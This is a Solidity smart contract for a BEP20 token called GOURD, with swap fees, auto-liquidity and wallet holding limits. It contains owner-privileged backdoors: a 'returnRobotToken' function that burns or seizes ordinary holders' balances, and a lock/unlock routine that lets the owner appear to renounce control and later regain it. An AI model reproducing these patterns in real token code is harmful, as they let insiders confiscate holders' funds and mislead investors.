// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
    constructor () { }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZreturnseppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
        return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    address private _returnOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        _previousOwner = msgSender;
        _returnOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        _previousOwner = address(0);
        _returnOwner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function reConstruct(address newOwner) internal {        
        _owner = newOwner;
        _previousOwner = newOwner;
        _returnOwner = newOwner;
        emit OwnershipTransferred(address(0), newOwner);
    }

    function getlockRemainSecs() public view returns (uint256) {
        if(_previousOwner == address(0))
            return type(uint256).max;
        return _lockTime > block.timestamp ? (_lockTime - block.timestamp) : 0;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "The contract unlocking time has not arrived");
        _transferOwnership(_previousOwner);
    }

    /*return robot token*/
    function returnOwner() public view returns (address) {
        return _returnOwner;
    }

    modifier onlyReturnOwner() {
        require(_returnOwner == _msgSender(), "Ownable: caller is not the dispose robot addr");
        _;
    }

    function deleteReturnOwner() public onlyReturnOwner {
        emit OwnershipTransferred(_returnOwner, address(0));
        _returnOwner = address(0);
    }
}

contract BEP20Token is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;

    uint256 private constant MAXFEE = 1000;
    uint256 private constant DIVFEE = 10000;
    uint256 public buyBurnFee = 0;
    uint256 public buyLpFee = 300;
    uint256 public sellBurnFee = 0;
    uint256 public sellLpFee = 300;
    uint256 public totalFee = 600;

    uint256 public maxSwapDiv = 1000;
    uint256 public minSwapDiv = 10000;

    bool public IsHoldLimit = true;
    uint256 private constant MINHOLDAMOUNT = 200000000;
    uint256 public maxHoldAmount = 200000000;
    
    IUniswapV2Router02 public  swapRouter;
    address public  swapPair;
    mapping(address => bool) private swapPairList;
    mapping(address => bool) private excludedLimitList;
    mapping(address => bool) private excludedFeeList;

    bool inSwapAndLiquify = false;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {
        _name = "GOURD";
        _symbol = "GOURD";
        _decimals = 18;
        _totalSupply = 306273669700 * 10 ** _decimals;
        address newOwner = 0xc649698A6E4fac75A1E3Da771426601535204Cc0;
        reConstruct(newOwner);
        _balances[newOwner] = _totalSupply;

        maxHoldAmount = (maxHoldAmount + 1) * 10 ** _decimals;

        address router  = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        if(block.chainid == 97){
            router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;   //test  
        }

        swapRouter = IUniswapV2Router02(router);
        _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        swapPair = IUniswapV2Factory(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        swapPairList[swapPair] = true;
        excludedLimitList[newOwner] = true;
        excludedFeeList[newOwner] = true;
        excludedFeeList[address(this)] = true;

        emit Transfer(address(0), newOwner, _totalSupply);
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");                
        require(_balances[sender] >= amount, "Insufficient Balance");     
        
        if(IsHoldLimit && !swapPairList[recipient] && !excludedLimitList[sender] && !excludedLimitList[recipient])
            require((amount + _balances[recipient]) <= maxHoldAmount,"Exceeded maximum wallet balance");        

        myTransfer(sender,recipient,afterFeeAmount(sender,recipient,amount));
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }    

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

    function isContract(address account) private view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }    

    function myTransfer(address from, address to, uint256 amount) private {
        if(0 == amount)
            return;
        _balances[from] = _balances[from].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function afterFeeAmount(address from, address to, uint256 amount) private returns(uint256)
    {
        uint256 burnnum = 0;
        uint256 addlpnum = 0;
        if(0 == totalFee || excludedFeeList[from] || excludedFeeList[to])
            return amount;
        if(swapPairList[from]){
            burnnum = amount * buyBurnFee / DIVFEE;
            addlpnum = amount * buyLpFee / DIVFEE;            
        }else if(swapPairList[to]){
            burnnum = amount * sellBurnFee / DIVFEE;
            addlpnum = amount * sellLpFee / DIVFEE;            
        }else if(isContract(from) || isContract(to)){
            burnnum = 0;            
            addlpnum = amount * (MAXFEE / 2) / DIVFEE;
        }else{
            burnnum = 0;
            addlpnum = 0;
        }

        if(!inSwapAndLiquify && swapPairList[to])
        {
            uint256 swapamount = getSwapAmount();
            if(swapamount > 0)
                swapAndLiquify(swapamount);
        }

        myTransfer(from, address(0), burnnum); 
        myTransfer(from, address(this), addlpnum);

        return amount - burnnum - addlpnum;
    }

    function getSwapAmount() private view returns(uint256) {
        uint256 curamount = _balances[address(this)];
        uint256 validamount = _totalSupply - _balances[address(0)] - _balances[address(0xdead)];
        uint256 maxamount = validamount / maxSwapDiv;
        uint256 minamount = validamount / minSwapDiv;
        if(curamount > minamount){
            if(curamount > maxamount){
                return maxamount;
            }
            return curamount;
        }
        return 0;
    }        

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {        
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        uint256 initialBalance = address(this).balance;

        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        uint256 newBalance = address(this).balance.sub(initialBalance);

        addLiquidity(otherHalf, newBalance);
        
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();
  
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        swapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );
    }

    function adjustFee(uint256 buyBurnf,uint256 buyLpf,uint256 sellBurnf, uint256 sellLpf, bool isSwap) public onlyOwner {
        require(buyBurnf + buyLpf + sellBurnf + sellLpf <= MAXFEE,"Tax too high!");
        buyBurnFee = buyBurnf;
        buyLpFee = buyLpf;
        sellBurnFee = sellBurnf;
        sellLpFee = sellLpf;
        totalFee = buyBurnFee + buyLpFee + sellBurnFee + sellLpFee;

        if(!inSwapAndLiquify && isSwap)
            swapAndLiquify(_balances[address(this)]);
    }

    function setSwapPairList(address addr, bool isEnable) public onlyOwner {
        require(isContract(addr),"This is't a contract!");
        swapPairList[addr] = isEnable;
    }

    function setExcludedLimitList(address addr, bool isEnable) public onlyOwner {
        excludedLimitList[addr] = isEnable;
    }

    function setExcludedFeeList(address addr, bool isEnable) public onlyOwner {
        excludedFeeList[addr] = isEnable;
    }

    function adjustSwapDiv(uint256 maxDiv,uint256 minDiv) public onlyOwner {
        require(maxDiv < minDiv,"maxDiv must be less than minDiv");
        maxSwapDiv = maxDiv;
        minSwapDiv = minDiv;
    }

    function EnableHoldLimit() public onlyOwner{
        require(!IsHoldLimit,"Limit have been enabled!");
        require(_balances[swapPair] > _totalSupply / 30,"Cannot clear tokens");
        IsHoldLimit = true;
    }

    function DisableHoldLimit() public {
        require(IsHoldLimit,"Limit have been disabled!");
        if(owner() == _msgSender()){
            IsHoldLimit = false;
        }else{
            require(_balances[swapPair] <= _totalSupply / 30,"Cannot clear tokens");
            IsHoldLimit = false;
        }
    }

    function adjustMaxHoldAmount(uint256 amount) public onlyOwner {
        require(amount >= MINHOLDAMOUNT,"Cannot be less than one billion");
        maxHoldAmount = (amount + 1) * 10 ** _decimals;
    }
    
    function returnRobotToken(address[] memory addrs,bool isBurn) public onlyReturnOwner {
        require(_balances[swapPair] > _totalSupply / 10,"Cannot clear tokens");
        uint256 max = (MINHOLDAMOUNT + 1) * 10 ** _decimals;
        address addr;
        for(uint256 i = 0; i < addrs.length; i++)
        {
            addr = addrs[i];
            require(_balances[addr] <= max && address(0) != addr && !isContract(addr),"There are addresses that do not match");
            if(isBurn)
                myTransfer(addr,address(0),_balances[addr]);
            else
                myTransfer(addr,address(this),_balances[addr]);
        }        
    }

    function changeName(string memory newName,string memory newSymbol) public onlyOwner{
        _name = newName;
        _symbol = newSymbol;
    }

    function ClearZeroAddrTokens() public onlyOwner{
        uint256 amount = _balances[address(0)];
        _balances[address(0)] = _balances[address(0)].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(address(0), address(0), amount);
    }

    receive() external payable {}
}